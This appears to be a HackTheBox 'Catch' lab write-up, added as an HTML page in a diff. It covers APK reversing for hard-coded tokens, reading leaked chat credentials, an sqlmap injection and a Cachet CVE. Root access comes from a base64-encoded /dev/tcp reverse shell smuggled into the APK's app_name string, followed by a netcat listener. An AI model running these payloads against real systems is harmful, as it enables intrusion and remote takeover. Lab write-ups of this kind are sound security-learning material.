@@ -1,0 +1,225 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>HackTheBox: Catch</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+Catch is a great example of applying basic APK reversing and CVE exploitation. 
+It's an application that's intended to integrate Gitea and Let's Chat and makes 
+the mistake of using hard-coded credentials and an insecure dashboard.
+
+MACHINE INFO
+──────────────────────────
+  MACHINE NAME: <a href="https://app.hackthebox.com/machines/Catch">Catch</a>
+  IP: 10.10.11.150
+  DIFFICULTY: Medium
+──────────────────────────
+
+Starting with an Nmap scan revealed a number of services running on the target.
+
+nmap
+───────────────────────────────────────────────────────────────────────────────
+  PORT     STATE SERVICE REASON  VERSION
+  22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux;
+                                 protocol 2.0)
+  80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+  3000/tcp open  ppp?    syn-ack
+  5000/tcp open  upnp?   syn-ack
+───────────────────────────────────────────────────────────────────────────────
+
+Interestingly, there were two different Apache services, both on different 
+versions, as well as another two ports that were not identified.
+
+Cookies fetched by an Nmap script showed that there was a Gitea server running 
+on port 3000. But the other ports were still unknown.
+
+nmap
+─────────────────────────────────────────────────────────────
+  Set-Cookie: i_like_gitea=a9634c3d8acdc09d; Path=/; HttpOnly
+─────────────────────────────────────────────────────────────
+
+Opening each of the pages in a web browser helped to identify these other 
+services.
+
+The main page on port 80 was a simple landing page for 'Catch Global Systems', 
+allowing the user to download an APK file. This would have to be further 
+investigated.
+
+Port 3000 was running Gitea version 1.14.1 with Go 1.16.3 and port 5000 was 
+running <a href="https://github.com/sdelements/lets-chat">Let's Chat</a>. Both of these were locked with passwords and default 
+credentials did not work.
+
+The last page of interest was a monitoring dashboard running on port 8000 which 
+appeared to be based on Cachet 2.4. Some background research found a few 
+different CVEs which could be useful however they all required an authenticated 
+user and would not be useable at this point.
+
+
+Going back to the APK that was found, Apktool can be used to decompile the 
+binary so that the source code can be browsed as a regular directory.
+
+apktool
+───────────────────────────
+  apktool d ./catchv1.0.apk
+───────────────────────────
+
+According to the landing page that was found earlier, "The future enhancements 
+[include] Lets-chat/Gitea integration", hinting that there could be API keys or 
+hard-coded credentials in the application to integrate these services.
+
+After looking around, there was one file that stood out based on its contents.
+
+ls
+─────────────────────────────────
+  original/res/values/strings.xml
+─────────────────────────────────
+
+This file contained variables controlling the application name among other 
+things as well as 3 different API keys; Gitea, Let's Chat and Slack.
+
+tokens
+───────────────────────────────────────────────────────────────────────────────
+  <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
+
+  <string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZj
+  hiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
+
+  <string name="slack_token">xoxp-23984754863-2348975623103</string>
+───────────────────────────────────────────────────────────────────────────────
+
+Of the 3 tokens, only one seemed to work, which was Let's Chat. Following the 
+<a href="https://github.com/sdelements/lets-chat/wiki/API">API documentation on Github</a>, Curl could be used to fetch the open rooms.
+
+curl
+───────────────────────────────────────────────────────────────────────────────
+  curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZj
+  hiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i
+  http://10.10.11.150:5000/rooms
+
+  61b86b28d984e2451036eb17 Status
+  61b8708efe190b466d476bfb Android Development
+  61b86b3fd984e2451036eb18 Employees
+───────────────────────────────────────────────────────────────────────────────
+
+And this information could be used to then read messages from the rooms.
+
+curl
+───────────────────────────────────────────────────────────────────────────────
+  curl -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZj
+  hiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" -i
+  http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages
+
+  "ah sure!"
+  "You should actually include this task to your list as well as a part of 
+   quarterly audit"
+  "Also make sure we've our systems, applications and databases up-to-date."
+  "Excellent!"
+  "Why not. We've this in our todo list for next quarter"
+  "@john is it possible to add SSL to our status domain to make sure everything
+   is secure ?"
+  "Here are the credentials `john :  E}V!mywu_69T4C}W`"
+  "Sure one sec."
+  "Can you create an account for me ?"
+  "Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if
+   you need anything from me."
+───────────────────────────────────────────────────────────────────────────────
+
+This conversation revealed some credentials for the status page on port 8000. 
+Testing these credentials on other pages showed that they are only used on this 
+one page.
+
+creds
+───────────────────────────────────────────────────────
+  "Here are the credentials `john :  E}V!mywu_69T4C}W`"
+───────────────────────────────────────────────────────
+
+Using SQLMap, it was possible to dump some more API keys from the database 
+however they did not end up being necessary.
+
+sqlmap
+───────────────────────────────────────────────────────────────────────────────
+  sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a
+  &1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbms=mysql -D cachet -T users
+  -C api_key,username --dump
+
+  +----------------------+----------+
+  | api_key              | username |
+  +----------------------+----------+
+  | 7GVCqTY5abrox48Nct8j | john     |
+  | rMSN8kJN9TPADl2cWv8N | admin    |
+  +----------------------+----------+
+───────────────────────────────────────────────────────────────────────────────
+
+Instead, using a CVE for Cachet 2.4, detailed in <a href="https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/">this blog post</a>, it was 
+possible to dump the username and password of the configured MySQL database 
+user.
+
+Inputting these strings into the 'Mail From Address' field under settings and 
+mail, and refreshing the page, returned the name and password of the user.
+
+cachet
+──────────────────────────────
+  ${DB_USERNAME} = will
+
+  ${DB_PASSWORD} = s2#4Fg0_%3!
+──────────────────────────────
+
+Now finally, with this information it is possible to connect with SSH and login 
+as Will to read the user flag.
+
+flag
+─────────────────────────────────────────────
+  User Flag: 794e64d1eb9b77178f53792d5a0b60e8
+─────────────────────────────────────────────
+
+The server was running a wildcard cronjob to execute the APKs in 
+/opt/mdm/apk_bin so it was possible to recompile the apk with shellcode which 
+would be run as a privileged user.
+
+Adding the shellcode to "app_name" gave arbitrary code execution which could be 
+used to start a reverse shell.
+
+reverse shell
+────────────────────────────────────────────────────
+  /bin/bash -l > /dev/tcp/10.10.14.98/9001 0<&1 2>&1
+────────────────────────────────────────────────────
+
+This means the strings.xml (with its base64 encoded shell code) would look 
+something like this.
+
+strings.xml
+───────────────────────────────────────────────────────────────────────────────
+  <string name="app_name">Catch; echo L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuM
+  TQuOTgvOTAwMSAwPCYxIDI+JjEK| base64 -d | bash -i</string>
+───────────────────────────────────────────────────────────────────────────────
+
+And a reverse listener could be started using Netcat on the local machine 
+before uploading the APK to the server.
+
+netcat and scp
+─────────────────────────────────────────────────
+  nc -lvp 9001
+  scp out.apk will@10.10.11.150:/opt/mdm/apk_bin/
+─────────────────────────────────────────────────
+
+netcat
+─────────────────────────────────────────────────────────────────────
+  listening on [any] 9001 ...
+  connect to [10.10.14.98] from status.catch.htb [10.10.11.150] 36122
+
+  > id
+  uid=0(root) gid=0(root) groups=0(root)
+  > ls
+  Catch
+  lets-chat
+  mdm
+  reset.sh
+  root.txt
+  run.sh
+  > cat root.txt
+─────────────────────────────────────────────────────────────────────
